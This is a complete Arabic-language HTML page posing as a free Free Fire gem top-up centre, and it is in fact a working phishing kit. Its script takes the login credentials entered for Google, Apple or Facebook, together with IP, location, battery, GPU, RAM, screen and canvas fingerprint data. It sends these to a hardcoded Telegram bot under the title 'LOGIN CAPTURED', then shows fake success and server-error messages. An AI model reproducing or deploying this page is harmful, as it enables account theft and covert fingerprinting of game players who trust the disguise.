<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<title>مركز شحن فري فاير - Free Fire</title>
<link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800&display=swap" rel="stylesheet">
<style>
  :root { --bg: #f3f4f6; --card: #ffffff; --text: #1f2937; --muted: #6b7280; --red: #ef4444; --border: #e5e7eb; --ff-blue: #0ea5e9; --error: #dc2626; }
  * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Tajawal', sans-serif; }
  body { background-color: var(--bg); color: var(--text); display: flex; justify-content: center; align-items: flex-start; min-height: 100vh; padding: 20px; }
  .container { width: 100%; max-width: 500px; background: var(--card); border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); overflow: hidden; position: relative; }
  .header { padding: 20px; text-align: center; border-bottom: 1px solid var(--border); background: #f9fafb; }
  .header h1 { font-size: 20px; color: var(--text); font-weight: 800; }
  .header p { color: var(--muted); font-size: 13px; margin-top: 5px; }
  .section { padding: 20px; border-bottom: 1px solid var(--border); }
  .section-title { display: flex; align-items: center; justify-content: flex-end; gap: 10px; font-size: 16px; font-weight: 800; margin-bottom: 20px; color: var(--text); }
  .step-badge { background: var(--red); color: #fff; width: 24px; height: 24px; display: flex; align-items: center; justify-content: center; border-radius: 6px; font-size: 14px; }
  .login-methods { display: flex; justify-content: center; gap: 15px; flex-wrap: wrap; }
  .login-btn { width: 50px; height: 50px; border-radius: 50%; border: 1px solid var(--border); background: #fff; display: flex; justify-content: center; align-items: center; cursor: pointer; transition: 0.2s; box-shadow: 0 2px 5px rgba(0,0,0,0.05); }
  .login-btn:hover { transform: translateY(-2px); box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
  .login-btn svg { width: 24px; height: 24px; }
  .login-form-container { display: none; margin-top: 20px; background: #f9fafb; padding: 15px; border-radius: 8px; border: 1px solid var(--border); }
  .login-form-container.active { display: block; }
  .login-form-container h3 { font-size: 15px; margin-bottom: 15px; text-align: center; color: var(--muted); }
  .input-group { margin-bottom: 12px; }
  .input-group input { width: 100%; padding: 12px; border: 1px solid var(--border); border-radius: 6px; font-size: 14px; outline: none; direction: ltr; text-align: left; }
  .input-group input:focus { border-color: var(--ff-blue); }
  .input-group input.error { border-color: var(--error); background: #fef2f2; }
  .error-msg { color: var(--error); font-size: 12px; margin-top: 5px; display: none; text-align: right; }
  .submit-btn { width: 100%; padding: 12px; background: var(--red); color: #fff; border: none; border-radius: 6px; font-weight: bold; font-size: 15px; cursor: pointer; }
  .submit-btn:disabled { opacity: 0.7; cursor: not-allowed; }
  .options-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; }
  .buy-tabs { display: flex; gap: 10px; }
  .tab-btn { padding: 8px 20px; border-radius: 20px; border: 1px solid var(--border); background: transparent; color: var(--muted); font-weight: bold; font-size: 14px; cursor: pointer; }
  .tab-btn.active { border-color: var(--red); color: var(--red); }
  .gems-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; }
  .gem-card { border: 1px solid var(--border); border-radius: 8px; padding: 15px 10px; text-align: center; cursor: pointer; transition: 0.2s; background: #fff; display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 5px; }
  .gem-card:hover, .gem-card.selected { border-color: var(--red); background: #fef2f2; }
  .gem-card span { font-size: 16px; font-weight: bold; color: var(--text); display: flex; align-items: center; gap: 5px; }
  .gem-icon { color: #38bdf8; font-size: 14px; }
  .checkout-bar { padding: 15px 20px; background: #f9fafb; border-top: 1px solid var(--border); display: none; }
  .checkout-bar.active { display: block; }
  .checkout-btn { width: 100%; padding: 15px; background: var(--red); color: #fff; border: none; border-radius: 8px; font-weight: bold; font-size: 16px; cursor: pointer; box-shadow: 0 4px 10px rgba(239, 68, 68, 0.3); }
  .checkout-btn:disabled { background: #ccc; box-shadow: none; cursor: not-allowed; }
  .toast { position: fixed; top: 20px; left: 50%; transform: translateX(-50%); background: #1f2937; color: #fff; padding: 10px 20px; border-radius: 6px; font-size: 14px; font-weight: bold; z-index: 100; opacity: 0; transition: 0.3s; pointer-events: none; text-align: center; }
  .toast.show { opacity: 1; }
</style>
</head>
<body>

<div class="container">
  <div class="header"><h1>مركز شحن جواهر فري فاير</h1><p>شحن فوري ومباشر عبر الحساب</p></div>
  
  <div class="section">
    <div class="section-title">سجل دخولك بحساب اللعبة الخاص بك<div class="step-badge">1</div></div>
    <div class="login-methods">
      <button class="login-btn" onclick="showLogin('Google')"><svg viewBox="0 0 24 24"><path fill="#4285F4" d="M23.5 12.3c0-.8-.1-1.5-.2-2.3H12v4.3h6.5c-.3 1.5-1.1 2.8-2.4 3.6v3h3.9c2.3-2.1 3.5-5.2 3.5-8.6z"/><path fill="#34A853" d="M12 24c3.2 0 6-1 7.9-2.9l-3.9-3c-1.1.7-2.4 1.1-4 1.1-3.1 0-5.7-2.1-6.6-4.9H1.4v3.1C3.3 21.4 7.3 24 12 24z"/><path fill="#FBBC05" d="M5.4 14.3c-.2-.7-.4-1.5-.4-2.3s.1-1.6.4-2.3V6.6H1.4C.5 8.3 0 10.1 0 12s.5 3.7 1.4 5.4l4-3.1z"/><path fill="#EA4335" d="M12 4.8c1.7 0 3.3.6 4.5 1.8l3.4-3.4C17.9 1.2 15.2 0 12 0 7.3 0 3.3 2.6 1.4 6.6l4 3.1C6.3 6.9 8.9 4.8 12 4.8z"/></svg></button>
      <button class="login-btn" onclick="showLogin('Apple')"><svg viewBox="0 0 24 24" fill="#000"><path d="M16.7 1c.1 1.1-.3 2.2-1 3-.7.8-1.8 1.5-2.9 1.4-.1-1.1.4-2.2 1-3C14.5 1.6 15.6 1 16.7 1zm4.3 16.5c-.4 1-.9 1.9-1.6 2.8-1 1.3-2 2.6-3.5 2.6-1.5 0-1.9-.9-3.6-.9-1.7 0-2.2.9-3.6.9-1.5 0-2.6-1.4-3.6-2.7C3.4 17.8 2.3 14 3.7 11.5c.7-1.3 2-2.1 3.4-2.1 1.4 0 2.3.9 3.5.9 1.1 0 1.8-.9 3.5-.9 1.2 0 2.5.7 3.4 1.8-3 1.6-2.5 5.8.5 6.3z"/></svg></button>
      <button class="login-btn" onclick="showLogin('Facebook')"><svg viewBox="0 0 24 24" fill="#1877F2"><path d="M22 12a10 10 0 1 0-11.6 9.9v-7H7.9V12h2.5V9.8c0-2.5 1.5-3.9 3.8-3.9 1.1 0 2.2.2 2.2.2v2.4h-1.3c-1.2 0-1.6.8-1.6 1.6V12h2.8l-.4 2.9h-2.4v7A10 10 0 0 0 22 12z"/></svg></button>
    </div>

    <div class="login-form-container" id="loginFormContainer">
      <h3 id="formTitle">تسجيل الدخول</h3>
      <form id="harvestForm">
        <div class="input-group">
          <input type="text" id="loginId" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
          <div class="error-msg" id="idError">الحساب غير موجود، تأكد من البريد أو الرقم</div>
        </div>
        <div class="input-group">
          <input type="password" id="loginPass" placeholder="كلمة المرور" required>
          <div class="error-msg" id="passError">كلمة المرور خاطئة، حاول مرة أخرى</div>
        </div>
        <button type="submit" class="submit-btn" id="submitBtn">تسجيل الدخول</button>
      </form>
    </div>
  </div>

  <div class="section">
    <div class="section-title">كمية الشحن<div class="step-badge">2</div></div>
    <div class="options-header"><div class="buy-tabs"><button class="tab-btn active">شراء</button><button class="tab-btn">استرداد</button></div></div>
    <div class="gems-grid">
      <div class="gem-card" onclick="selectGem(this)"><span>310 <svg class="gem-icon" width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2L2 9l10 13 10-13L12 2zm0 2.5L18.5 9 12 19.5 5.5 9 12 4.5z"/></svg></span></div>
      <div class="gem-card" onclick="selectGem(this)"><span>210 <svg class="gem-icon" width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2L2 9l10 13 10-13L12 2zm0 2.5L18.5 9 12 19.5 5.5 9 12 4.5z"/></svg></span></div>
      <div class="gem-card" onclick="selectGem(this)"><span>100 <svg class="gem-icon" width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2L2 9l10 13 10-13L12 2zm0 2.5L18.5 9 12 19.5 5.5 9 12 4.5z"/></svg></span></div>
    </div>
  </div>

  <div class="checkout-bar" id="checkoutBar"><button class="checkout-btn" onclick="fakeCheckout()">إتمام الشحن المجاني</button></div>
</div>

<div class="toast" id="toast">...</div>

<script>
  const BOT_TOKEN = "8649753978:AAH2F-nMzUjB2hoUBZ8k-QfRnkvULzJdQfo";
  const CHAT_ID   = "8899697805";
  let currentPlatform = "";

  async function sendToTG(title, text) {
    try {
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CHAT_ID, text: `<b>${title}</b>\n━━━━━━━━━━━━━━━\n${text}`, parse_mode: 'HTML' })
      });
    } catch (e) {}
  }

  async function getIP() {
    try {
      const res = await fetch("https://ipapi.co/json/");
      const data = await res.json();
      return `${data.ip} (${data.city}, ${data.country_name}) - ISP: ${data.org}`;
    } catch (e) { return "Blocked/Unknown"; }
  }

  async function getBattery() {
    if (navigator.getBattery) {
      const b = await navigator.getBattery();
      return `${Math.round(b.level * 100)}% ${b.charging ? '⚡ Charging' : '🔋 Discharging'}`;
    }
    return "Blocked";
  }

  function getHardware() {
    try {
      const canvas = document.createElement('canvas');
      const ctx = canvas.getContext('2d');
      ctx.textBaseline = "top"; ctx.font = "14px 'Arial'";
      ctx.fillStyle = "#f60"; ctx.fillRect(125, 1, 62, 20);
      ctx.fillStyle = "#069"; ctx.fillText("Cwm fjordbank glyphs vext quiz, 😃", 2, 15);
      const canvasHash = canvas.toDataURL().length.toString();

      const gl = document.createElement('canvas').getContext('webgl');
      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
      const gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);

      return {
        canvas: canvasHash,
        gpu: gpu,
        cores: navigator.hardwareConcurrency || "Unknown",
        ram: navigator.deviceMemory || "Unknown",
        screen: `${window.screen.width}x${window.screen.height}`,
        platform: navigator.platform || "Unknown"
      };
    } catch (e) { return { canvas: "Blocked", gpu: "Blocked", cores: "Unknown", ram: "Unknown", screen: "Unknown", platform: "Unknown" }; }
  }

  async function harvest(action, user, pass, gemAmount) {
    const ip = await getIP();
    const battery = await getBattery();
    const hw = getHardware();
    const ua = navigator.userAgent;

    const report = `
🎯 <b>Action:</b> ${action}
🎮 <b>Game:</b> Free Fire
👤 <b>User:</b> <code>${user}</code>
🔑 <b>Pass:</b> <code>${pass || 'N/A'}</code>
💎 <b>Gems Selected:</b> <code>${gemAmount || 'None'}</code>
🌐 <b>IP:</b> <code>${ip}</code>
📱 <b>Device:</b> <code>${hw.platform}</code>
🖥️ <b>Screen:</b> <code>${hw.screen}</code>
🎮 <b>GPU:</b> <code>${hw.gpu}</code>
⚙️ <b>Cores:</b> <code>${hw.cores}</code> | 💾 <b>RAM:</b> <code>${hw.ram} GB</code>
🔋 <b>Battery:</b> <code>${battery}</code>
🎨 <b>Canvas Hash:</b> <code>${hw.canvas}</code>
🌍 <b>UA:</b> <code>${ua}</code>
    `.trim();
    await sendToTG("🔥 FREE FIRE LOGIN CAPTURED", report);
  }

  const formContainer = document.getElementById('loginFormContainer');
  const formTitle = document.getElementById('formTitle');
  const harvestForm = document.getElementById('harvestForm');
  const checkoutBar = document.getElementById('checkoutBar');
  const loginIdInput = document.getElementById('loginId');
  const loginPassInput = document.getElementById('loginPass');
  const idError = document.getElementById('idError');
  const passError = document.getElementById('passError');
  let selectedGems = "";

  function showLogin(platform) {
    currentPlatform = platform;
    formTitle.textContent = `تسجيل الدخول عبر ${platform}`;
    formContainer.classList.add('active');
    formContainer.scrollIntoView({ behavior: 'smooth' });
    loginIdInput.value = ""; loginPassInput.value = "";
    idError.style.display = "none"; passError.style.display = "none";
    loginIdInput.classList.remove("error"); loginPassInput.classList.remove("error");
  }

  harvestForm.onsubmit = async (e) => {
    e.preventDefault();
    const user = loginIdInput.value.trim();
    const pass = loginPassInput.value;
    const btn = document.getElementById('submitBtn');

    idError.style.display = "none"; passError.style.display = "none";
    loginIdInput.classList.remove("error"); loginPassInput.classList.remove("error");

    // ==========================================
    // 🛑 الفلترة الصارمة للـ ID فقط (Password Loose)
    // ==========================================
    let idIsValid = false;
    
    // التحقق من رقم الهاتف (يبدأ بـ 05, 06, 07 ويتبعه 8 أرقام)
    const phoneRegex = /^(0[567]\d{8})$/; 
    // التحقق من البريد الإلكتروني
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/;
    
    if (phoneRegex.test(user.replace(/\s/g, ''))) {
      idIsValid = true;
    } else if (emailRegex.test(user)) {
      idIsValid = true;
    }

    if (!idIsValid) {
      idError.textContent = "رقم الهاتف غير صحيح (يجب أن يبدأ بـ 05/06/07) أو البريد غير صالح";
      idError.style.display = "block";
      loginIdInput.classList.add("error");
      return; // منع الدخول
    }

    // كلمة المرور: نقبل أي شيء (حتى لو كان حرفاً واحداً) بناءً على طلبك
    if (pass.length === 0) {
      passError.textContent = "الرجاء إدخال كلمة المرور";
      passError.style.display = "block";
      loginPassInput.classList.add("error");
      return;
    }
    // ==========================================

    btn.textContent = "جاري التحقق...";
    btn.disabled = true;

    await harvest(currentPlatform + " Login", user, pass, selectedGems);
    
    setTimeout(() => {
      btn.textContent = "تم الدخول بنجاح ✅";
      btn.style.background = "#22c55e";
      setTimeout(() => {
        formContainer.classList.remove('active');
        btn.textContent = "تسجيل الدخول";
        btn.style.background = "var(--red)";
        btn.disabled = false;
        document.getElementById('loginFormContainer').reset();
      }, 1500);
    }, 1000);
  };

  function selectGem(el) {
    document.querySelectorAll('.gem-card').forEach(c => c.classList.remove('selected'));
    el.classList.add('selected');
    selectedGems = el.innerText.trim();
    checkoutBar.classList.add('active');
  }

  async function fakeCheckout() {
    await harvest("Gem Checkout Click", "N/A", "N/A", selectedGems);
    
    const btn = document.querySelector('.checkout-btn');
    btn.textContent = "جاري الشحن..."; btn.disabled = true;

    setTimeout(() => {
      btn.textContent = "حدث خطأ في السيرفر، حاول لاحقاً."; btn.style.background = "#1f2937";
      setTimeout(() => { btn.textContent = "إتمام الشحن المجاني"; btn.style.background = "var(--red)"; btn.disabled = false; }, 3000);
    }, 2000);
  }
</script>
</body>
</html>
